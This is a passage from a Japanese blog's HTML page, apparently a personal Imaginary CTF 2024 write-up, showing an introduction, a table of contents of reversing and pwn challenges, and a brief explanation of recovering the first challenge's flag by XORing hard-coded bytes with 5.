<!DOCTYPE html><html lang="ja"><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><style data-href="/styles.e71379dda153709d1a9a.css" id="gatsby-global-css">html{font-size:100}body{margin:0 0 0 calc(100vw - 100%);color:#222;line-height:1.4;font-size:.875rem;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;background-color:#fcfcfc}body,h1,h2,h3,h4,h5,h6{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif}h1,h2,h3,h4,h5,h6{font-weight:600}h1{font-size:1.575rem;line-height:2.25rem;margin-top:5rem;margin-bottom:1.25rem}h2{font-size:1.47656rem;line-height:1.875rem}h2,h3{margin-top:2.5rem;margin-bottom:.625rem}h3{font-size:1.20313rem;line-height:1.25rem}h4{font-size:1.05rem;margin-top:1.875rem}h4,h5{line-height:1.25rem;margin-bottom:.625rem}h5,h6{font-size:.875rem;margin-top:3.125rem}h6{line-height:1.25rem;margin-bottom:.625rem}img{max-width:100%;margin:inherit auto}hr,img{border:0;display:block}hr{color:#222;height:1.625rem;margin:3.25rem auto;background-size:100% 26px;background-image:linear-gradient(180deg,transparent 1px,transparent 11px,#222 0,#222 15px,transparent 0,transparent 26px);width:6.25rem}a{color:#918d40;text-decoration:none}a:active,a:focus,a:hover{color:#a9d159}b,strong{font-weight:600}ul{list-style:square;margin-bottom:1.25rem}ul li{padding:0 .3125rem;margin-bottom:.625rem}p{line-height:1.25rem;margin-bottom:1.25rem}blockquote{font-style:italic;text-align:center;background-color:#f5f5f5;padding:.1875rem .625rem}figure{display:block;width:100%;height:auto}figcaption{line-height:.9375rem;margin-top:.3125rem;color:#222;font-size:.75rem;font-style:italic;margin-bottom:0;text-align:center}.anchor{margin-left:-1.875rem!important;padding-right:.875rem!important}@media screen and (min-width:685px){figure.float-left,figure.float-right{max-width:19.375rem;padding:0 1.25rem}.float-right{float:right}.float-left{float:left}}code[class*=language-],pre[class*=language-]{color:#ccc;background:0 0;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:1em;margin:.5em 0;overflow:auto}:not(pre)>code[class*=language-],pre[class*=language-]{background:#2d2d2d}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal}.token.block-comment,.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#999}.token.punctuation{color:#ccc}.token.attr-name,.token.deleted,.token.namespace,.token.tag{color:#e2777a}.token.function-name{color:#6196cc}.token.boolean,.token.function,.token.number{color:#f08d49}.token.class-name,.token.constant,.token.property,.token.symbol{color:#f8c555}.token.atrule,.token.builtin,.token.important,.token.keyword,.token.selector{color:#cc99cd}.token.attr-value,.token.char,.token.regex,.token.string,.token.variable{color:#7ec699}.token.entity,.token.operator,.token.url{color:#67cdcc}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}.token.inserted{color:green}li>code[class*=language-text],p>code[class*=language-text]{background:#f9f9f9!important;color:#2d2d2d!important}.Author-module--author__photo--36xCH{display:inline-block;margin-bottom:0;border-radius:50%;background-clip:padding-box}.Author-module--author__title--2CaTb{font-size:.98438rem;font-weight:600;line-height:1.40625rem;margin:.625rem 0}.Author-module--author__title-link--Yrism,.Author-module--author__title-link--Yrism:focus,.Author-module--author__title-link--Yrism:hover{color:#222}.Author-module--author__subtitle--cAaEB{color:#888;line-height:1.25rem;margin-bottom:1.25rem}.Icon-module--icon--Gpyvw{display:inline-block;width:1em;height:1em;stroke-width:0;stroke:currentColor;fill:currentColor;font-style:normal;font-weight:400;speak:none;margin-right:.2em;text-align:center;font-variant:normal;text-transform:none;line-height:1em;margin-left:.2em;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.Contacts-module--contacts--1rGd1{margin-bottom:1.25rem}.Contacts-module--contacts__list--3OgdW{display:flex;flex-flow:row wrap;flex-grow:0;flex-shrink:0;list-style:none;padding:0;margin:.625rem -.1875rem;width:8.75rem}.Contacts-module--contacts__list-item--16p9q{padding:0;margin:.25rem;display:flex;align-content:center;align-items:center;justify-content:center;height:2.1875rem;width:2.1875rem;line-height:2.1875rem;border-radius:50%;text-align:center;border:1px solid #ebebeb}.Contacts-module--contacts__list-item-link--2MIDn{border:0;display:flex;color:#222}.Contacts-module--contacts__list-item-link--2MIDn:focus,.Contacts-module--contacts__list-item-link--2MIDn:hover{color:#918d40}.Copyright-module--copyright--1ariN{color:#b6b6b6;font-size:.75rem}.Menu-module--menu--Efbin{margin-bottom:1.25rem}.Menu-module--menu__list--31Zeo{list-style:none;padding:0;margin:0}.Menu-module--menu__list-item--1lJ6B{padding:0;margin:.625rem 0}.Menu-module--menu__list-item-link--10Ush{font-size:.875rem;color:#222;font-weight:400;border:0}.Menu-module--menu__list-item-link--10Ush:focus,.Menu-module--menu__list-item-link--10Ush:hover{color:#918d40;border-bottom:1px solid #918d40}.Menu-module--menu__list-item-link--active--2CbUO{color:#222;border-bottom:1px solid #222}.Sidebar-module--sidebar--X4z2p{width:100%}.Sidebar-module--sidebar__inner--Jdc5s{position:relative;padding:1.5625rem 1.25rem 0}.Sidebar-module--headerimage--19Rdy{width:100%;min-height:70px;max-height:120px;margin:0 0 .625rem}.Sidebar-module--logo-image--XDYae{min-height:70px;max-height:120px;margin:0 auto}input{-webkit-appearance:none;-moz-appearance:none;appearance:none;padding:.625rem;margin:.3125rem 0;border:1px solid #999;border-radius:.3125rem}.Sidebar-module--search-container--17C6F{position:relative}.Sidebar-module--search-container-input--27Tw4{width:100%}.Sidebar-module--search-container-submit--WwtLg{position:absolute;width:2.375rem;height:2.375rem;top:calc(50% - 19px);right:0;border:3px solid #999;border-radius:0 .25rem .25rem 0;background:#999}.Sidebar-module--search-container-submit--WwtLg:before{position:absolute;content:"";width:.9375rem;height:.9375rem;top:calc(50% - 9px);left:calc(50% - 9px);border-radius:50%;box-shadow:0 0 0 2px #fff}.Sidebar-module--search-container-submit--WwtLg:after{position:absolute;content:"";width:.5rem;height:.375rem;top:calc(50% + 6px);left:calc(50% + 2px);border-top:2px solid #fff;transform:rotate(45deg)}@media screen and (min-width:685px){.Sidebar-module--sidebar--X4z2p{width:calc(41.625% - 1.09375rem)}.Sidebar-module--sidebar--X4z2p:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Sidebar-module--sidebar--X4z2p:last-child{margin-right:0}.Sidebar-module--sidebar--X4z2p:nth-child(12n){margin-right:0;float:right}.Sidebar-module--sidebar--X4z2p:nth-child(12n+1){clear:both}.Sidebar-module--sidebar__inner--Jdc5s{padding:1.875rem 1.25rem 0}.Sidebar-module--sidebar__inner--Jdc5s:after{background:#e6e6e6;background:linear-gradient(180deg,#e6e6e6 0,#e6e6e6 48%,#fff);position:absolute;content:"";width:.0625rem;height:33.75rem;top:30px;right:-10px;bottom:0}}@media screen and (min-width:960px){.Sidebar-module--sidebar--X4z2p{width:calc(33.3% - 1.25rem)}.Sidebar-module--sidebar--X4z2p:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Sidebar-module--sidebar--X4z2p:last-child{margin-right:0}.Sidebar-module--sidebar--X4z2p:nth-child(3n){margin-right:0;float:right}.Sidebar-module--sidebar--X4z2p:nth-child(3n+1){clear:both}.Sidebar-module--sidebar__inner--Jdc5s{padding:2.5rem}}.Layout-module--layout--3Pyz6{max-width:66.875rem;margin-left:auto;margin-right:auto}.Layout-module--layout--3Pyz6:before{content:"";display:table}.Layout-module--layout--3Pyz6:after{content:"";display:table;clear:both}.Feed-module--feed__item--2D5rE{margin-bottom:1.5625rem}.Feed-module--feed__item--2D5rE:last-child{margin-bottom:.625rem}.Feed-module--feed__item-title--3nigr{font-size:1.47656rem;line-height:1.875rem;margin-top:0;margin-bottom:.625rem}.Feed-module--feed__item-title-link--iFMRs{color:#222}.Feed-module--feed__item-title-link--iFMRs:focus,.Feed-module--feed__item-title-link--iFMRs:hover{color:#222;border-bottom:1px solid #222}.Feed-module--feed__item-description--1uO8e{font-size:.875rem;line-height:1.25rem;margin-bottom:.9375rem}.Feed-module--feed__item-meta-time--3t1fg{font-size:.75rem;color:#222;font-weight:600;text-transform:uppercase}.Feed-module--feed__item-meta-divider--N-Q0A{margin:0 .3125rem}.Feed-module--feed__item-meta-category-link--23f8F{font-size:.75rem;color:#a9d159;font-weight:600;text-transform:uppercase}.Feed-module--feed__item-meta-category-link--23f8F:focus,.Feed-module--feed__item-meta-category-link--23f8F:hover{color:#918d40}.Feed-module--feed__item-readmore--1u6bI{font-size:.875rem;color:#918d40}.Feed-module--feed__item-readmore--1u6bI:focus,.Feed-module--feed__item-readmore--1u6bI:hover{color:#918d40;border-bottom:1px solid #918d40}.Page-module--page--2nMky{margin-bottom:2.5rem}.Page-module--page__inner--2M_vz{padding:1.5625rem 1.25rem}.Page-module--page__title--GPD8L{font-size:1.575rem;font-weight:600;line-height:2.5rem;margin-top:0;margin-bottom:1.8125rem}.Page-module--page__body--Ic6i6{font-size:.875rem;line-height:1.25rem;margin:0 0 1.25rem}@media screen and (min-width:685px){.Page-module--page--2nMky{width:calc(58.275% - .78125rem)}.Page-module--page--2nMky:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Page-module--page--2nMky:last-child{margin-right:0}.Page-module--page--2nMky:nth-child(12n){margin-right:0;float:right}.Page-module--page--2nMky:nth-child(12n+1){clear:both}.Page-module--page__inner--2M_vz{padding:1.875rem 1.25rem}}@media screen and (min-width:960px){.Page-module--page--2nMky{width:calc(66.6% - .625rem)}.Page-module--page--2nMky:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Page-module--page--2nMky:last-child{margin-right:0}.Page-module--page--2nMky:nth-child(3n){margin-right:0;float:right}.Page-module--page--2nMky:nth-child(3n+1){clear:both}.Page-module--page__inner--2M_vz{padding:2.5rem 2.1875rem}}.Pagination-module--pagination--2H3nO{margin-top:2.5rem;display:flex}.Pagination-module--pagination__prev--bet5s{width:50%;text-align:left}.Pagination-module--pagination__prev-link--1Nzs6{color:#a9d159;font-size:1.625rem;font-weight:700}.Pagination-module--pagination__prev-link--1Nzs6:focus,.Pagination-module--pagination__prev-link--1Nzs6:hover{color:#918d40}.Pagination-module--pagination__prev-link--disable--Yklx9{pointer-events:none;color:#bbb}.Pagination-module--pagination__next--3hFiN{width:50%;text-align:right}.Pagination-module--pagination__next-link--3FUtA{color:#a9d159;font-size:1.625rem;font-weight:700}.Pagination-module--pagination__next-link--3FUtA:focus,.Pagination-module--pagination__next-link--3FUtA:hover{color:#918d40}.Pagination-module--pagination__next-link--disable--30UwZ{pointer-events:none;color:#bbb}.Author-module--author--2Yefr{border-top:1px solid #e6e6e6;max-width:43.75rem;padding-top:1.25rem;line-height:1.25rem;margin-top:1.25rem;margin-bottom:2.5rem}.Author-module--author__bio-twitter--n-O9n{display:block;text-decoration:underline}@media screen and (min-width:685px){.Author-module--author--2Yefr{margin-left:auto;margin-right:auto}}.Content-module--content--3p512{max-width:62.8125rem;padding:0 .9375rem;margin:0 auto}.Content-module--content__title--2BDW9{font-size:1.75rem;max-width:43.75rem;font-weight:600;text-align:center;line-height:2.0625rem;margin:1.25rem auto 0}.Content-module--content__body--2TrQ- figure{margin-bottom:1.25rem}.Content-module--content__body--2TrQ- figure blockquote{font-style:italic;text-align:center;margin-top:0;padding:1.25rem 0}.Content-module--content__body--2TrQ- figure blockquote p{max-width:43.75rem;font-size:1.47149rem;margin-top:1.25rem;margin-bottom:1.25rem;line-height:1.875rem}.Content-module--content__body--2TrQ- a{text-decoration:underline}.Content-module--content__body--2TrQ- *{max-width:43.75rem;margin-left:auto;margin-right:auto}.Content-module--content__body--2TrQ- img{max-width:100%;margin-top:.625rem;margin-bottom:.625rem}.Content-module--content__body--2TrQ- li ul{margin-bottom:.625rem}.Content-module--content__body--2TrQ- li p{line-height:1.25rem;margin-bottom:.625rem}.Content-module--content__body--2TrQ- h2{position:relative;padding:1rem 1.5rem;color:#fff;border-radius:.625rem;background:#0c0000}.Content-module--content__body--2TrQ- h2:after{position:absolute;bottom:-9px;left:1rem;width:0;height:0;content:"";border-color:#0c0000 transparent transparent;border-style:solid;border-width:10px 10px 0}.Content-module--content__body--2TrQ- h3{border-bottom:3px dotted #0c0000;padding:1rem 0}@media screen and (min-width:960px){.Content-module--content--3p512{padding:0}.Content-module--content__title--2BDW9{font-size:1.75rem;line-height:2.8125rem;margin-top:2.8125rem;margin-bottom:1.875rem}.Content-module--content__body--2TrQ-,.Content-module--content__body--2TrQ- p{font-size:.98438rem;line-height:1.40625rem;margin-bottom:1.40625rem}.Content-module--content__body--2TrQ- li p{line-height:1.25rem;margin-bottom:.625rem}}.Meta-module--meta__date--29eD7{font-style:italic}.Tags-module--tags--1L_ct{margin-bottom:.625rem}.Tags-module--tags__list--91FqN{list-style:none;margin:0 -.625rem;padding:0}.Tags-module--tags__list-item--1M30P{display:inline-block;margin:.625rem .3125rem}.Tags-module--tags__list-item-link--3SL_8{display:inline-block;height:2.1875rem;padding:0 1.5rem;line-height:2.1875rem;border:1px solid #e6e6e6;text-decoration:none;border-radius:1.25rem;color:#222}.Tags-module--tags__list-item-link--3SL_8:focus,.Tags-module--tags__list-item-link--3SL_8:hover{color:#918d40}.Post-module--post__comments--25y6I,.Post-module--post__footer--3WzWU{max-width:43.75rem;margin:0 auto;padding:0 .9375rem}.Post-module--post__home-button--16Kl0{display:block;max-width:5.625rem;height:2.1875rem;padding:0 1.5rem;line-height:2.1875rem;text-align:center;color:#222;border:1px solid #e6e6e6;border-radius:1.25rem;font-size:.875rem;font-weight:400;margin-left:auto;margin-right:auto;margin-top:1.25rem}.Post-module--post__home-button--16Kl0:focus,.Post-module--post__home-button--16Kl0:hover{color:#918d40}@media screen and (min-width:960px){.Post-module--post__comments--25y6I,.Post-module--post__footer--3WzWU{padding:0}.Post-module--post__home-button--16Kl0{position:fixed;max-width:auto;margin:0;top:30px;left:30px}}</style><meta name="generator" content="Gatsby 2.32.13"/><link rel="alternate" type="application/rss+xml" title="かえるのひみつきち" href="/rss.xml"/><style type="text/css">
    .anchor.before {
      position: absolute;
      top: 0;
      left: 0;
      transform: translateX(-100%);
      padding-right: 4px;
    }
    .anchor.after {
      display: inline-block;
      padding-left: 4px;
    }
    h1 .anchor svg,
    h2 .anchor svg,
    h3 .anchor svg,
    h4 .anchor svg,
    h5 .anchor svg,
    h6 .anchor svg {
      visibility: hidden;
    }
    h1:hover .anchor svg,
    h2:hover .anchor svg,
    h3:hover .anchor svg,
    h4:hover .anchor svg,
    h5:hover .anchor svg,
    h6:hover .anchor svg,
    h1 .anchor:focus svg,
    h2 .anchor:focus svg,
    h3 .anchor:focus svg,
    h4 .anchor:focus svg,
    h5 .anchor:focus svg,
    h6 .anchor:focus svg {
      visibility: visible;
    }
  </style><script>
    document.addEventListener("DOMContentLoaded", function(event) {
      var hash = window.decodeURI(location.hash.replace('#', ''))
      if (hash !== '') {
        var element = document.getElementById(hash)
        if (element) {
          var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop
          var clientTop = document.documentElement.clientTop || document.body.clientTop || 0
          var offset = element.getBoundingClientRect().top + scrollTop - clientTop
          // Wait for the browser to finish rendering before scrolling.
          setTimeout((function() {
            window.scrollTo(0, offset - 0)
          }), 0)
        }
      }
    })
  </script><link rel="preconnect dns-prefetch" href="https://www.google-analytics.com"/><script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-122086587-6"></script><script>
      
      
      if(true) {
        window.dataLayer = window.dataLayer || [];
        function gtag(){window.dataLayer && window.dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-122086587-6', {"send_page_view":false});
      }
      </script><link rel="sitemap" type="application/xml" href="/sitemap.xml"/><link rel="icon" href="/favicon-32x32.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d" type="image/png"/><link rel="manifest" href="/manifest.webmanifest" crossorigin="anonymous"/><meta name="theme-color" content="#F7A046"/><link rel="apple-touch-icon" sizes="48x48" href="/icons/icon-48x48.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="72x72" href="/icons/icon-72x72.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="96x96" href="/icons/icon-96x96.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="144x144" href="/icons/icon-144x144.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="192x192" href="/icons/icon-192x192.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="256x256" href="/icons/icon-256x256.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="384x384" href="/icons/icon-384x384.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="512x512" href="/icons/icon-512x512.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><title data-react-helmet="true">Imaginary CTF 2024 Writeup - かえるのひみつきち</title><meta data-react-helmet="true" name="description" content="Imaginary CTF 2024 Writeup"/><meta data-react-helmet="true" property="og:site_name" content="Imaginary CTF 2024 Writeup - かえるのひみつきち"/><meta data-react-helmet="true" property="og:image" content="https://kashiwaba-yuki.com/static/eacfb66aaf6166f81e2c55c75d9d475e/ctf-imaginary-ctf-2024.png"/><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"/><meta data-react-helmet="true" name="twitter:title" content="Imaginary CTF 2024 Writeup - かえるのひみつきち"/><meta data-react-helmet="true" name="twitter:description" content="Imaginary CTF 2024 Writeup"/><meta data-react-helmet="true" name="twitter:image" content="https://kashiwaba-yuki.com/static/eacfb66aaf6166f81e2c55c75d9d475e/ctf-imaginary-ctf-2024.png"/><link as="script" rel="preload" href="/webpack-runtime-a3c0f166cb4b802ff58f.js"/><link as="script" rel="preload" href="/framework-3761df4ab6ee9f056936.js"/><link as="script" rel="preload" href="/532a2f07-92db97c0addf07d5cb73.js"/><link as="script" rel="preload" href="/dc6a8720040df98778fe970bf6c000a41750d3ae-a9848960b1159a07f14e.js"/><link as="script" rel="preload" href="/app-75393366a30b6ef90e4a.js"/><link as="script" rel="preload" href="/styles-407fe62976dc5310c43e.js"/><link as="script" rel="preload" href="/cd95ea5cbd2c605f26db819f07999610c9ff4310-c2f05dc74373de400085.js"/><link as="script" rel="preload" href="/component---src-templates-post-template-js-381c1b847824134fa4bd.js"/><link as="fetch" rel="preload" href="/page-data/ctf-imaginary-ctf-2024/page-data.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/251939775.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/401334301.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/825871152.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/app-data.json" crossorigin="anonymous"/></head><body><div id="___gatsby"><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><div class="Layout-module--layout--3Pyz6"><div><a class="Post-module--post__home-button--16Kl0" href="/">All Articles</a><div><div class="Content-module--content--3p512"><h1 class="Content-module--content__title--2BDW9">Imaginary CTF 2024 Writeup</h1><div class="Content-module--content__body--2TrQ-"><p>2024 年 7 月 20 日から開催されていた Imaginary CTF に 0nePadding で参加していました。</p>
<p>フル参加できなかった割には悪くない順位でした。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/9a6eb8a159e6769320e6729d487a2598/4cdc7/image-20240722203307698.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 21.666666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAmUlEQVQY012PyQ7DMAhE/f8/2VulNvEKGNzLFDtKuhyegJmxDMHGC2rjYs7EgpgyYkyopeK+Z2ze51KWnnJZmf+3k1AbQdVgZuh6MA1xmg6Qc8uGZ1PUPpDkxJD4l+JayL5BZkV0YSNDJF3sTpUZUjRnhqvXrnp9/I30Qw/UDY9C2CutMyZza2KGiM/EC5G+tMP75Jp77N5Z30PxNI+BRctdAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/9a6eb8a159e6769320e6729d487a2598/8ac56/image-20240722203307698.webp 240w,
/static/9a6eb8a159e6769320e6729d487a2598/d3be9/image-20240722203307698.webp 480w,
/static/9a6eb8a159e6769320e6729d487a2598/e46b2/image-20240722203307698.webp 960w,
/static/9a6eb8a159e6769320e6729d487a2598/518ae/image-20240722203307698.webp 1327w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/9a6eb8a159e6769320e6729d487a2598/8ff5a/image-20240722203307698.png 240w,
/static/9a6eb8a159e6769320e6729d487a2598/e85cb/image-20240722203307698.png 480w,
/static/9a6eb8a159e6769320e6729d487a2598/d9199/image-20240722203307698.png 960w,
/static/9a6eb8a159e6769320e6729d487a2598/4cdc7/image-20240722203307698.png 1327w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/9a6eb8a159e6769320e6729d487a2598/d9199/image-20240722203307698.png"
            alt="image-20240722203307698"
            title="image-20240722203307698"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>いつも通り適当に Writeup を書いていきます。</p>
<!-- omit in toc -->
<h2 id="もくじ" style="position:relative;"><a href="#%E3%82%82%E3%81%8F%E3%81%98" aria-label="もくじ permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>もくじ</h2>
<ul>
<li><a href="#unoriginalrev">unoriginal(Rev)</a></li>
<li><a href="#bfrev">BF(Rev)</a></li>
<li><a href="#rustrev">Rust(Rev)</a></li>
<li><a href="#unconditionalrev">unconditional(Rev)</a></li>
<li><a href="#watchdogrev">watchdog(Rev)</a></li>
<li><a href="#imgstorepwn">imgstore(Pwn)</a></li>
<li><a href="#ropitypwn">ropity(Pwn)</a></li>
<li><a href="#%E3%81%BE%E3%81%A8%E3%82%81">まとめ</a></li>
</ul>
<h2 id="unoriginalrev" style="position:relative;"><a href="#unoriginalrev" aria-label="unoriginalrev permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>unoriginal(Rev)</h2>
<blockquote>
<p>i like elf reversing</p>
</blockquote>
<p>問題バイナリを解析すると、以下の通り入力値を 5 で XOR した値がハードコードされたバイト列に一致するかを検証しています。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 619px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/6319d2411d74002b312efcd33770b6f7/e628c/image-20240720114948867.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 80%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAAC1ElEQVQ4y41U2XLbRhDEd9hOSSRBAHtgsbh5iJTAA7wpR3mzo/z/X7R7l4qsqrjKeejawSzR6JnpYbC5HNG/XLA+7nG+7nF6PqA//Ynj9YzLM5+vFxwuF563+Hh9xvFyYHwivmJ/uqDb9lj1O38GZlKhXM+gyxwqNZBaQ5kM2tziRN0glEIi1e1ZSh8LqT18/g2BrDPYVYvEpgjHsSfRJCyqiiQacZJAiBjjWCARLhaQzEeJQKQkIpIPwzFG48gjMA8VmusjVJXxpQRNXWA6adHWUxS2xKxu8NA0mFRTNGUJay1sXkCzmiSjulRTSIQwij0C1eQod3PIkoRRApulmM3nMDbHyH05jKiAP3bnKMKAucEovKl6gyN6V6gnBarjAqq2iKjQZAppZn0/Y8GShCuVPdMKsZa3mL1yHx9Hsa9q/KbOK5StRXl6QJJrKghJEEPpFDnL0exn0bYkYmlWw5Qa0rB/vL9PYvwxHOHLYOjPewfGQXfeof/2jKdDj8Vjh8VTh9V6jV2/wZpW6Dc9/qYdvhP/bHd4Ze47c6/9Ht82W3/312qNZddhudkgmB1I8HrGZLVAyQEsn+bYMl7zB+uOpIsOp+UK/fTBYzvl/WTmz81kytwcj02LioOr+BzELNU81ogMxz8a01cRpHR9EYjHtEYk8YXlfLq7x+f7AT7fDXyZHsPhf0s2ixqTlw66sb7BzmN1YTht+jPLUWQGGW1iOChBi8jc+IH4IdC3fjAfh+KmW2ynSNhsdyE5TcWtiBNJcgWTSpJlSLk5btIqd24QCGn4SIp3y7wT6mmB+rz0Cp1thBKomwqWvjSWSo3itGml1JEr5EXpje1MrYrsF4T0YX1aQFOpS0RxzBcFN8GtmPRK/zWtgzP08M3wow8r99PYLTdlz01h30K3KTZDS4VNzT+N4mbw8EOPfocgyVOk85JmlT/lO/cTIzZ9GIbvqv4PfgAMY/Co3ahkzAAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/6319d2411d74002b312efcd33770b6f7/8ac56/image-20240720114948867.webp 240w,
/static/6319d2411d74002b312efcd33770b6f7/d3be9/image-20240720114948867.webp 480w,
/static/6319d2411d74002b312efcd33770b6f7/3aa79/image-20240720114948867.webp 619w"
              sizes="(max-width: 619px) 100vw, 619px"
              type="image/webp"
            />
          <source
            srcset="/static/6319d2411d74002b312efcd33770b6f7/8ff5a/image-20240720114948867.png 240w,
/static/6319d2411d74002b312efcd33770b6f7/e85cb/image-20240720114948867.png 480w,
/static/6319d2411d74002b312efcd33770b6f7/e628c/image-20240720114948867.png 619w"
            sizes="(max-width: 619px) 100vw, 619px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/6319d2411d74002b312efcd33770b6f7/e628c/image-20240720114948867.png"
            alt="image-20240720114948867"
            title="image-20240720114948867"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>これをそのまま XOR すると Flag を復号できました。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 803px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/3450f870f83ca4dec79e1470b462613e/e1031/image-20240720114932487.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 36.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABEUlEQVQoz4WQD2uDMBDF/f4fbDAGmzjLVv+0dZqa2k4TY0xixbckwzIYtAc/EnKXu3svqOkRJSmhjMKo5Q2lR2R5ijB6Q2XzTXNCxximyUBrZdH/MEYj2DYbfDQhDmyLXfeJvT0PngQFT5CeYxTfKYZhAOccrOsghPB3KSWYHeJyfd9DKYWg7inkZCfOI8ysIFQPrjrQnqBuj9DXEUxdcJ0nuFiW5S5BesrtFgV2bekhvEQtvlCxPYpLDjpUoKIC47+bGGPuEsRViNfqCWH9jIi+IG3fkbUxsi5GzjZI2sjLJ4SAUuo//fXNyVzxDeUkvVQnzaFuSI9/szVuO4fzb/VsPZ2fDt9wnhc8iuVxyS1+AJ0EGJN5NqqUAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/3450f870f83ca4dec79e1470b462613e/8ac56/image-20240720114932487.webp 240w,
